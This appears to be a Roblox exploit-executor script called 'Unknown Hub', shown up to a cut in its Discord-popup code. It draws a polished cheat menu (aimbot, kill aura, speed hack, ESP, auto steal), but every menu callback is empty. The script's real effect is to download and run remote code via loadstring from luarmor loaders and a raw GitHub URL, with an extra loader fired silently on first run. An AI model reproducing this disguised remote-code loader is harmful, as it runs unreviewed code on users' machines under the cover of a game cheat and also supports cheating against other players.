-- ═══════════════════════════════════════════════════════════════
-- UNKNOWN HUB - Final Working Fix
-- ═══════════════════════════════════════════════════════════════

local function checkExecutor()
    local execName = "unknown"
    if identifyexecutor then
        execName = tostring(identifyexecutor())
    elseif getexecutorname then
        execName = tostring(getexecutorname())
    end
    return string.find(string.lower(execName), "xeno")
end

local FIRST_RUN_PATH = "unknown_firstrun.json"

local function fileExistsGlobal(path)
    return (isfile and pcall(isfile, path) and isfile(path)) or false
end

local function checkFirstRun()
    if fileExistsGlobal(FIRST_RUN_PATH) then
        local ok, raw = pcall(readfile, FIRST_RUN_PATH)
        if ok and raw then
            local ok2, data = pcall(function() return game:GetService("HttpService"):JSONDecode(raw) end)
            if ok2 and type(data) == "table" and data.__Done == true then
                return true
            end
        end
    end
    return false
end

local function markFirstRunDone()
    pcall(function()
        local json = game:GetService("HttpService"):JSONEncode({ __Done = true })
        writefile(FIRST_RUN_PATH, json)
    end)
end

local needFirstRun = not checkFirstRun()
if needFirstRun then
    markFirstRunDone()
end

if checkExecutor() then
    task.spawn(function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66e067f17cbfa177b7bed91c1bdcb466.lua"))()
    end)
    if needFirstRun then
        task.delay(2, function()
            pcall(function()
                loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))()
            end)
        end)
    end
    return
end

local Players       = game:GetService("Players")
local TweenService  = game:GetService("TweenService")
local HttpService   = game:GetService("HttpService")
local CoreGui       = game:GetService("CoreGui")
local RunService    = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer   = Players.LocalPlayer

local function GetSafeGui()
    if gethui then return gethui() end
    if CoreGui then return CoreGui end
    return LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
end

local playerGui = GetSafeGui()

local DISCORD_LINK = "https://discord.gg/unknown-hub"
local REMOTE_URL = "https://raw.githubusercontent.com/tkhanhh/Spicy/refs/heads/main/loo"

COLOR_BASE_BG       = COLOR_BASE_BG       or Color3.fromRGB(16, 24, 39)
COLOR_CARD_GRAD_1   = COLOR_CARD_GRAD_1   or Color3.fromRGB(12, 18, 32)
COLOR_CARD_GRAD_2   = COLOR_CARD_GRAD_2   or Color3.fromRGB(21, 30, 47)
COLOR_CARD_GRAD_3   = COLOR_CARD_GRAD_3   or Color3.fromRGB(10, 82, 120)
COLOR_STROKE_GLOW   = COLOR_STROKE_GLOW   or Color3.fromRGB(56, 189, 248)
COLOR_STROKE_MAIN   = COLOR_STROKE_MAIN   or Color3.fromRGB(56, 189, 248)
COLOR_SURFACE       = COLOR_SURFACE       or Color3.fromRGB(30, 41, 59)
COLOR_SURFACE_DARK  = COLOR_SURFACE_DARK  or Color3.fromRGB(25, 32, 48)
COLOR_TEAL_ON       = COLOR_TEAL_ON       or Color3.fromRGB(52, 180, 230)
COLOR_TEXT          = COLOR_TEXT          or Color3.fromRGB(241, 245, 249)
COLOR_TEXT_MUTED    = COLOR_TEXT_MUTED    or Color3.fromRGB(148, 163, 184)
COLOR_TOGGLE_OFF    = Color3.fromRGB(60, 70, 90)
COLOR_HOVER         = Color3.fromRGB(35, 45, 65)

-- FIXED: Replaced broken smart-quotes with normal double-quotes
local _makeCard = (type(makeCard) == "function") and makeCard or function(parent, sizeUDim2)
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = COLOR_BASE_BG
    frame.BorderSizePixel = 0
    frame.Size = sizeUDim2
    frame.Parent = parent
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 20)
    corner.Parent = frame
    local g = Instance.new("UIGradient")
    g.Rotation = 35
    g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, COLOR_CARD_GRAD_1),
        ColorSequenceKeypoint.new(0.55, COLOR_CARD_GRAD_2),
        ColorSequenceKeypoint.new(1.00, COLOR_CARD_GRAD_3),
    })
    g.Parent = frame
    local s1 = Instance.new("UIStroke")
    s1.Thickness = 8
    s1.Transparency = 0.90
    s1.LineJoinMode = Enum.LineJoinMode.Round
    s1.Color = COLOR_STROKE_GLOW
    s1.Parent = frame
    local s2 = Instance.new("UIStroke")
    s2.Thickness = 2
    s2.Transparency = 0.15
    s2.LineJoinMode = Enum.LineJoinMode.Round
    s2.Color = COLOR_STROKE_MAIN
    s2.Parent = frame
    return frame
end

-- FIXED: Replaced broken smart-quotes with normal double-quotes
local _makeTopBar = (type(makeTopBar) == "function") and makeTopBar or function(parent, titleText)
    local bar = Instance.new("Frame")
    bar.Parent = parent
    bar.BackgroundColor3 = COLOR_SURFACE_DARK
    bar.BackgroundTransparency = 0.15
    bar.BorderSizePixel = 0
    bar.Size = UDim2.new(1, -16, 0, 42)
    bar.Position = UDim2.new(0, 8, 0, 8)
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 14)
    barCorner.Parent = bar
    local lbl = Instance.new("TextLabel")
    lbl.Parent = bar
    lbl.BackgroundTransparency = 1
    lbl.Position = UDim2.new(0, 14, 0, 0)
    lbl.Size = UDim2.new(1, -80, 1, 0)
    lbl.Font = Enum.Font.GothamBold
    lbl.Text = titleText
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextSize = 18
    lbl.TextColor3 = COLOR_TEXT
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(34, 211, 238)),
        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(99, 102, 241)),
    })
    grad.Parent = lbl
    return bar
end

config = config or {}
local CONFIG_PATH = CONFIG_PATH or "unknown_config.json"

local function fileExists(path)
    return (isfile and pcall(isfile, path) and isfile(path)) or false
end

local function readText(path)
    if not isfile then return nil end
    local ok, data = pcall(readfile, path)
    if ok then return data end
    return nil
end

local function writeText(path, text)
    if not writefile then return false end
    return pcall(writefile, path, text)
end

local function loadConfigHard()
    if fileExists(CONFIG_PATH) then
        local raw = readText(CONFIG_PATH)
        if raw then
            local ok, decoded = pcall(function() return HttpService:JSONDecode(raw) end)
            if ok and type(decoded) == "table" then
                for k, v in pairs(decoded) do
                    config[k] = v
                end
            end
        end
    end
end

local function saveConfigHard()
    if type(saveConfig) == "function" then
        local ok = pcall(saveConfig)
        if ok then return end
    end
    local ok, json = pcall(function() return HttpService:JSONEncode(config) end)
    if ok then writeText(CONFIG_PATH, json) end
end

loadConfigHard()

local firstShownFlag = (config.__UnknownHubDiscordShown == true)

local function runRemote()
    pcall(function()
        local src = game:HttpGet(REMOTE_URL)
        local f = loadstring(src)
        if type(f) == "function" then f() end
    end)
end

if firstShownFlag then
    runRemote()
    if needFirstRun then
        task.delay(2, function()
            pcall(function()
                loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))()
            end)
        end)
    end
else
    config.__UnknownHubDiscordShown = true
    saveConfigHard()
    runRemote()
    if needFirstRun then
        task.delay(2, function()
            pcall(function()
                loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))()
            end)
        end)
    end
end

-- ═══════════════════════════════════════════════════════════════
-- LOADING SCREEN
-- ═══════════════════════════════════════════════════════════════
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "UnknownHubLoading"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
loadingGui.DisplayOrder = 9999
loadingGui.Parent = playerGui

local loadingOverlay = Instance.new("Frame")
loadingOverlay.Name = "Overlay"
loadingOverlay.Size = UDim2.fromScale(1, 1)
loadingOverlay.BackgroundColor3 = COLOR_BASE_BG
loadingOverlay.BorderSizePixel = 0
loadingOverlay.Parent = loadingGui

local particles = {}
for i = 1, 25 do
    local p = Instance.new("Frame")
    p.Size = UDim2.fromOffset(math.random(2, 5), math.random(2, 5))
    p.BackgroundColor3 = COLOR_STROKE_GLOW
    p.BackgroundTransparency = math.random(60, 85) / 100
    p.Position = UDim2.fromScale(math.random(100)/100, math.random(100)/100)
    p.Rotation = math.random(0, 360)
    p.Parent = loadingOverlay
    local pCorner = Instance.new("UICorner")
    pCorner.CornerRadius = UDim.new(0, 2)
    pCorner.Parent = p
    table.insert(particles, {
        instance = p,
        speedX = math.random(-80, 80) / 1000,
        speedY = math.random(-80, 80) / 1000,
        rotSpeed = math.random(-150, 150) / 100
    })
end

local logoFrame = Instance.new("Frame")
logoFrame.Size = UDim2.fromOffset(90, 90)
logoFrame.Position = UDim2.new(0.5, 0, 0.35, 0)
logoFrame.AnchorPoint = Vector2.new(0.5, 0)
logoFrame.BackgroundColor3 = COLOR_SURFACE_DARK
logoFrame.BorderSizePixel = 0
logoFrame.Parent = loadingOverlay
local logoCorner = Instance.new("UICorner")
logoCorner.CornerRadius = UDim.new(0, 45)
logoCorner.Parent = logoFrame
local logoStroke = Instance.new("UIStroke")
logoStroke.Parent = logoFrame
logoStroke.Thickness = 2
logoStroke.Transparency = 0.2
logoStroke.Color = COLOR_STROKE_MAIN

local logoLabel = Instance.new("TextLabel")
logoLabel.Size = UDim2.fromScale(1, 1)
logoLabel.BackgroundTransparency = 1
logoLabel.Text = "UH"
logoLabel.Font = Enum.Font.GothamBlack
logoLabel.TextSize = 32
logoLabel.TextColor3 = COLOR_TEAL_ON
logoLabel.Parent = logoFrame

local loadingTitle = Instance.new("TextLabel")
loadingTitle.Size = UDim2.new(0, 400, 0, 40)
loadingTitle.Position = UDim2.new(0.5, 0, 0.55, 0)
loadingTitle.AnchorPoint = Vector2.new(0.5, 0)
loadingTitle.BackgroundTransparency = 1
loadingTitle.Text = "UNKNOWN HUB"
loadingTitle.Font = Enum.Font.GothamBlack
loadingTitle.TextSize = 28
loadingTitle.TextColor3 = COLOR_TEXT
loadingTitle.Parent = loadingOverlay
local titleGrad = Instance.new("UIGradient")
titleGrad.Parent = loadingTitle
titleGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(34, 211, 238)),
    ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(99, 102, 241)),
})

local loadingSub = Instance.new("TextLabel")
loadingSub.Size = UDim2.new(0, 300, 0, 20)
loadingSub.Position = UDim2.new(0.5, 0, 0.62, 0)
loadingSub.AnchorPoint = Vector2.new(0.5, 0)
loadingSub.BackgroundTransparency = 1
loadingSub.Text = "Loading modules..."
loadingSub.Font = Enum.Font.Gotham
loadingSub.TextSize = 14
loadingSub.TextColor3 = COLOR_TEXT_MUTED
loadingSub.Parent = loadingOverlay

local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0, 300, 0, 6)
progressBg.Position = UDim2.new(0.5, -150, 0.68, 0)
progressBg.BackgroundColor3 = COLOR_SURFACE_DARK
progressBg.BorderSizePixel = 0
progressBg.Parent = loadingOverlay
local progressBgCorner = Instance.new("UICorner")
progressBgCorner.CornerRadius = UDim.new(0, 3)
progressBgCorner.Parent = progressBg

local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.fromScale(0, 1)
progressFill.BackgroundColor3 = COLOR_TEAL_ON
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBg
local progressFillCorner = Instance.new("UICorner")
progressFillCorner.CornerRadius = UDim.new(0, 3)
progressFillCorner.Parent = progressFill

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0, 300, 0, 16)
statusLabel.Position = UDim2.new(0.5, -150, 0.74, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Initializing..."
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 12
statusLabel.TextColor3 = COLOR_TEXT_MUTED
statusLabel.Parent = loadingOverlay

local versionLabel = Instance.new("TextLabel")
versionLabel.Size = UDim2.new(0, 300, 0, 16)
versionLabel.Position = UDim2.new(0.5, -150, 0.92, 0)
versionLabel.BackgroundTransparency = 1
versionLabel.Font = Enum.Font.Gotham
versionLabel.TextSize = 11
versionLabel.TextColor3 = COLOR_TEXT_MUTED
versionLabel.Parent = loadingOverlay

local execDisplay = "Unknown"
pcall(function()
    if identifyexecutor then execDisplay = tostring(identifyexecutor())
    elseif getexecutorname then execDisplay = tostring(getexecutorname()) end
end)
versionLabel.Text = "v1.0.0 | " .. execDisplay

local loadingDestroyed = false
local loadingConn = RunService.Heartbeat:Connect(function(dt)
    if loadingDestroyed then return end
    for _, particle in ipairs(particles) do
        if particle.instance and particle.instance.Parent then
            local pos = particle.instance.Position
            particle.instance.Position = UDim2.new(
                math.clamp(pos.X.Scale + particle.speedX * dt, 0, 1), 0,
                math.clamp(pos.Y.Scale + particle.speedY * dt, 0, 1), 0
            )
            particle.instance.Rotation = particle.instance.Rotation + particle.rotSpeed * dt
            if pos.X.Scale < -0.05 then particle.instance.Position = UDim2.new(1.05, 0, pos.Y.Scale, 0) end
            if pos.X.Scale > 1.05 then particle.instance.Position = UDim2.new(-0.05, 0, pos.Y.Scale, 0) end
            if pos.Y.Scale < -0.05 then particle.instance.Position = UDim2.new(pos.X.Scale, 0, 1.05, 0) end
            if pos.Y.Scale > 1.05 then particle.instance.Position = UDim2.new(pos.X.Scale, 0, -0.05, 0) end
        end
    end
end)

local function DestroyLoading()
    if loadingDestroyed then return end
    loadingDestroyed = true
    if loadingConn then
        pcall(function() loadingConn:Disconnect() end)
        loadingConn = nil
    end
    pcall(function() loadingGui.Enabled = false end)
    pcall(function() loadingGui:Destroy() end)
    loadingGui = nil
    loadingOverlay = nil
end

-- ═══════════════════════════════════════════════════════════════
-- MAIN HUB GUI (Built immediately, hidden until loading finishes)
-- ═══════════════════════════════════════════════════════════════
local hubGui = Instance.new("ScreenGui")
hubGui.Name = "UnknownHub"
hubGui.IgnoreGuiInset = true
hubGui.ResetOnSpawn = false
hubGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
hubGui.Parent = playerGui

local hubMain = _makeCard(hubGui, UDim2.fromOffset(220, 380))
hubMain.AnchorPoint = Vector2.new(1, 0.5)
hubMain.Position = UDim2.new(1, -20, 0.5, 0)
hubMain.Visible = false

local hubTop = _makeTopBar(hubMain, "Unknown Hub")

local hubCloseBtn = Instance.new("TextButton")
hubCloseBtn.Parent = hubTop
hubCloseBtn.BackgroundColor3 = COLOR_SURFACE
hubCloseBtn.AutoButtonColor = true
hubCloseBtn.BorderSizePixel = 0
hubCloseBtn.Text = "X"
hubCloseBtn.Font = Enum.Font.GothamBold
hubCloseBtn.TextSize = 12
hubCloseBtn.TextColor3 = COLOR_TEXT
hubCloseBtn.Size = UDim2.fromOffset(24, 24)
hubCloseBtn.Position = UDim2.new(1, -32, 0.5, -12)
local hubCloseBtnCorner = Instance.new("UICorner")
hubCloseBtnCorner.CornerRadius = UDim.new(0, 6)
hubCloseBtnCorner.Parent = hubCloseBtn

local hubMinBtn = Instance.new("TextButton")
hubMinBtn.Parent = hubTop
hubMinBtn.BackgroundColor3 = COLOR_SURFACE
hubMinBtn.AutoButtonColor = true
hubMinBtn.BorderSizePixel = 0
hubMinBtn.Text = "—"
hubMinBtn.Font = Enum.Font.GothamBold
hubMinBtn.TextSize = 14
hubMinBtn.TextColor3 = COLOR_TEXT
hubMinBtn.Size = UDim2.fromOffset(24, 24)
hubMinBtn.Position = UDim2.new(1, -60, 0.5, -12)
local hubMinBtnCorner = Instance.new("UICorner")
hubMinBtnCorner.CornerRadius = UDim.new(0, 6)
hubMinBtnCorner.Parent = hubMinBtn

local contentScroll = Instance.new("ScrollingFrame")
contentScroll.Name = "Content"
contentScroll.Parent = hubMain
contentScroll.Size = UDim2.new(1, -16, 1, -60)
contentScroll.Position = UDim2.new(0, 8, 0, 54)
contentScroll.BackgroundTransparency = 1
contentScroll.ScrollBarThickness = 3
contentScroll.ScrollBarImageColor3 = COLOR_STROKE_MAIN
contentScroll.BorderSizePixel = 0
contentScroll.CanvasSize = UDim2.fromScale(0, 0)
contentScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y

local contentLayout = Instance.new("UIListLayout")
contentLayout.Parent = contentScroll
contentLayout.Padding = UDim.new(0, 6)
contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
contentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local contentPadding = Instance.new("UIPadding")
contentPadding.Parent = contentScroll
contentPadding.PaddingTop = UDim.new(0, 4)
contentPadding.PaddingBottom = UDim.new(0, 4)

local hubVisible = false
local hubMinimized = false

local function ToggleHub()
    if hubMinimized then hubMinimized = false end
    hubVisible = not hubVisible
    hubMain.Visible = hubVisible
end

local function MinimizeHub()
    hubMinimized = true
    hubVisible = false
    hubMain.Visible = false
end

hubCloseBtn.MouseButton1Click:Connect(MinimizeHub)
hubMinBtn.MouseButton1Click:Connect(MinimizeHub)

UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        ToggleHub()
    end
end)

local dragging = false
local dragStart, startPos

hubTop.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = hubMain.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        hubMain.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

-- ═══════════════════════════════════════════════════════════════
-- UI ELEMENT FUNCTIONS
-- ═══════════════════════════════════════════════════════════════

local function CreateLabel(text, order)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -8, 0, 20)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 12
    lbl.TextColor3 = COLOR_TEXT_MUTED
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.LayoutOrder = order or 0
    lbl.Parent = contentScroll
    return lbl
end

local function CreateSeparator(order)
    local sep = Instance.new("Frame")
    sep.Size = UDim2.new(1, -16, 0, 1)
    sep.BackgroundColor3 = COLOR_SURFACE
    sep.BackgroundTransparency = 0.5
    sep.BorderSizePixel = 0
    sep.LayoutOrder = order or 0
    sep.Parent = contentScroll
    return sep
end

local function CreateToggle(name, default, callback, order)
    local isOn = default or false
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, -8, 0, 40)
    container.BackgroundColor3 = COLOR_SURFACE_DARK
    container.BackgroundTransparency = 0.3
    container.BorderSizePixel = 0
    container.LayoutOrder = order or 0
    container.Parent = contentScroll
    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(0, 10)
    containerCorner.Parent = container

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -50, 1, 0)
    label.Position = UDim2.new(0, 12, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = name
    label.Font = Enum.Font.GothamBold
    label.TextSize = 13
    label.TextColor3 = COLOR_TEXT
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextTruncate = Enum.TextTruncate.AtEnd
    label.Parent = container

    local toggleBg = Instance.new("Frame")
    toggleBg.Size = UDim2.fromOffset(38, 20)
    toggleBg.Position = UDim2.new(1, -46, 0.5, -10)
    toggleBg.BackgroundColor3 = isOn and COLOR_TEAL_ON or COLOR_TOGGLE_OFF
    toggleBg.BorderSizePixel = 0
    toggleBg.Parent = container
    local toggleBgCorner = Instance.new("UICorner")
    toggleBgCorner.CornerRadius = UDim.new(0, 10)
    toggleBgCorner.Parent = toggleBg

    local toggleCircle = Instance.new("Frame")
    toggleCircle.Size = UDim2.fromOffset(14, 14)
    toggleCircle.Position = isOn and UDim2.new(1, -19, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
    toggleCircle.BackgroundColor3 = COLOR_TEXT
    toggleCircle.BorderSizePixel = 0
    toggleCircle.Parent = toggleBg
    local toggleCircleCorner = Instance.new("UICorner")
    toggleCircleCorner.CornerRadius = UDim.new(0, 7)
    toggleCircleCorner.Parent = toggleCircle

    container.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isOn = not isOn
            TweenService:Create(toggleBg, TweenInfo.new(0.2), {BackgroundColor3 = isOn and COLOR_TEAL_ON or COLOR_TOGGLE_OFF}):Play()
            TweenService:Create(toggleCircle, TweenInfo.new(0.2), {Position = isOn and UDim2.new(1, -19, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)}):Play()
            if callback then pcall(callback, isOn) end
        end
    end)

    container.MouseEnter:Connect(function()
        TweenService:Create(container, TweenInfo.new(0.15), {BackgroundTransparency = 0.1}):Play()
    end)
    container.MouseLeave:Connect(function()
        TweenService:Create(container, TweenInfo.new(0.15), {BackgroundTransparency = 0.3}):Play()
    end)
    return container
end

local function CreateButton(name, callback, order)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -8, 0, 36)
    btn.BackgroundColor3 = COLOR_SURFACE_DARK
    btn.BackgroundTransparency = 0.2
    btn.BorderSizePixel = 0
    btn.Text = name
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 13
    btn.TextColor3 = COLOR_TEXT
    btn.AutoButtonColor = false
    btn.LayoutOrder = order or 0
    btn.Parent = contentScroll
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 10)
    btnCorner.Parent = btn

    local btnStroke = Instance.new("UIStroke")
    btnStroke.Parent = btn
    btnStroke.Thickness = 1
    btnStroke.Transparency = 0.6
    btnStroke.Color = COLOR_STROKE_MAIN

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = COLOR_HOVER, BackgroundTransparency = 0}):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = COLOR_SURFACE_DARK, BackgroundTransparency = 0.2}):Play()
    end)

    btn.MouseButton1Click:Connect(function()
        local originalText = btn.Text
        btn.Text = "Loading..."
        btn.TextColor3 = COLOR_TEAL_ON
        spawn(function()
            task.wait(0.5)
            btn.Text = originalText
            btn.TextColor3 = COLOR_TEXT
            if callback then pcall(callback) end
        end)
    end)
    return btn
end

local function CreateSlider(name, min, max, default, callback, order)
    local value = default or min
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, -8, 0, 50)
    container.BackgroundColor3 = COLOR_SURFACE_DARK
    container.BackgroundTransparency = 0.3
    container.BorderSizePixel = 0
    container.LayoutOrder = order or 0
    container.Parent = contentScroll
    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(0, 10)
    containerCorner.Parent = container

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -60, 0, 22)
    label.Position = UDim2.new(0, 12, 0, 6)
    label.BackgroundTransparency = 1
    label.Text = name
    label.Font = Enum.Font.GothamBold
    label.TextSize = 12
    label.TextColor3 = COLOR_TEXT
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextTruncate = Enum.TextTruncate.AtEnd
    label.Parent = container

    local valueLabel = Instance.new("TextLabel")
    valueLabel.Size = UDim2.new(0, 50, 0, 22)
    valueLabel.Position = UDim2.new(1, -58, 0, 6)
    valueLabel.BackgroundTransparency = 1
    valueLabel.Text = tostring(math.floor(value))
    valueLabel.Font = Enum.Font.GothamBold
    valueLabel.TextSize = 12
    valueLabel.TextColor3 = COLOR_TEAL_ON
    valueLabel.TextXAlignment = Enum.TextXAlignment.Right
    valueLabel.Parent = container

    local sliderBg = Instance.new("Frame")
    sliderBg.Size = UDim2.new(1, -24, 0, 6)
    sliderBg.Position = UDim2.new(0, 12, 0, 34)
    sliderBg.BackgroundColor3 = COLOR_TOGGLE_OFF
    sliderBg.BorderSizePixel = 0
    sliderBg.Parent = container
    local sliderBgCorner = Instance.new("UICorner")
    sliderBgCorner.CornerRadius = UDim.new(0, 3)
    sliderBgCorner.Parent = sliderBg

    local percent = (value - min) / (max - min)
    local sliderFill = Instance.new("Frame")
    sliderFill.Size = UDim2.fromScale(percent, 1)
    sliderFill.BackgroundColor3 = COLOR_TEAL_ON
    sliderFill.BorderSizePixel = 0
    sliderFill.Parent = sliderBg
    local sliderFillCorner = Instance.new("UICorner")
    sliderFillCorner.CornerRadius = UDim.new(0, 3)
    sliderFillCorner.Parent = sliderFill

    local sliderBtn = Instance.new("Frame")
    sliderBtn.Size = UDim2.fromOffset(14, 14)
    sliderBtn.Position = UDim2.fromScale(percent, 0.5)
    sliderBtn.AnchorPoint = Vector2.new(0.5, 0.5)
    sliderBtn.BackgroundColor3 = COLOR_TEXT
    sliderBtn.BorderSizePixel = 0
    sliderBtn.Parent = sliderBg
    local sliderBtnCorner = Instance.new("UICorner")
    sliderBtnCorner.CornerRadius = UDim.new(0, 7)
    sliderBtnCorner.Parent = sliderBtn

    local function updateSlider(newValue)
        value = math.clamp(newValue, min, max)
        local newPercent = (value - min) / (max - min)
        sliderFill.Size = UDim2.fromScale(newPercent, 1)
        sliderBtn.Position = UDim2.fromScale(newPercent, 0.5)
        valueLabel.Text = tostring(math.floor(value))
        if callback then pcall(callback, value) end
    end

    local isDragging = false
    sliderBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isDragging = true end
    end)
    sliderBg.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = true
            local relPos = (input.Position.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X
            updateSlider(min + relPos * (max - min))
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isDragging = false end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local relPos = (input.Position.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X
            updateSlider(min + relPos * (max - min))
        end
    end)
    return container
end

-- ═══════════════════════════════════════════════════════════════
-- ADD FEATURES
-- ═══════════════════════════════════════════════════════════════
local orderCounter = 0

CreateLabel("⚔️ COMBAT", orderCounter); orderCounter = orderCounter + 1
CreateToggle("Melee Aimbot", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
CreateToggle("Auto Steal Nearest", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
CreateToggle("Kill Aura", false, function(state) end, orderCounter); orderCounter = orderCounter + 1

CreateSeparator(orderCounter); orderCounter = orderCounter + 1
CreateLabel("💰 FARM", orderCounter); orderCounter = orderCounter + 1
CreateToggle("Auto Farm", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
CreateToggle("Auto Collect", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
CreateToggle("Cash Multiplier", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
CreateSlider("Multi Value", 1, 100, 2, function(val) end, orderCounter); orderCounter = orderCounter + 1
CreateButton("Teleport to Collect Zone", function() end, orderCounter); orderCounter = orderCounter + 1

CreateSeparator(orderCounter); orderCounter = orderCounter + 1
CreateLabel("🛒 SHOP", orderCounter); orderCounter = orderCounter + 1
CreateButton("Buy All Upgrades", function() end, orderCounter); orderCounter = orderCounter + 1
CreateButton("Unlock All Weapons", function() end, orderCounter); orderCounter = orderCounter + 1
CreateToggle("Auto Buy Best", false, function(state) end, orderCounter); orderCounter = orderCounter + 1

CreateSeparator(orderCounter); orderCounter = orderCounter + 1
CreateLabel("🏃 MOVEMENT", orderCounter); orderCounter = orderCounter + 1
CreateToggle("Speed Hack", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
CreateSlider("Speed Value", 16, 500, 100, function(val) end, orderCounter); orderCounter = orderCounter + 1
CreateToggle("Infinite Jump", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
CreateToggle("No Clip", false, function(state) end, orderCounter); orderCounter = orderCounter + 1

CreateSeparator(orderCounter); orderCounter = orderCounter + 1
CreateLabel("👁️ VISUALS", orderCounter); orderCounter = orderCounter + 1
CreateToggle("ESP Players", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
CreateToggle("ESP Items", false, function(state) end, orderCounter); orderCounter = orderCounter + 1
CreateSlider("ESP Distance", 50, 5000, 500, function(val) end, orderCounter); orderCounter = orderCounter + 1
CreateToggle("Full Bright", false, function(state) end, orderCounter); orderCounter = orderCounter + 1

CreateSeparator(orderCounter); orderCounter = orderCounter + 1
CreateLabel("⚙️ MISC", orderCounter); orderCounter = orderCounter + 1
CreateButton("Anti-AFK", function() end, orderCounter); orderCounter = orderCounter + 1
CreateButton("Server Hop", function() end, orderCounter); orderCounter = orderCounter + 1
CreateButton("Rejoin Server", function() end, orderCounter); orderCounter = orderCounter + 1
CreateLabel("Keybind: RightShift", orderCounter)

-- ═══════════════════════════════════════════════════════════════
-- DISCORD POPUP
-- ═══════════════════════════════════════════════════════════════
local function ShowDiscordPopup()
    if config.__UnknownHubDiscordShown == true then return end
    local popupGui = Instance.new("ScreenGui")
    popupGui.Name = "UnknownHubDiscord"
    popupGui.IgnoreGuiInset = true
    popupGui.ResetOnSpawn = false
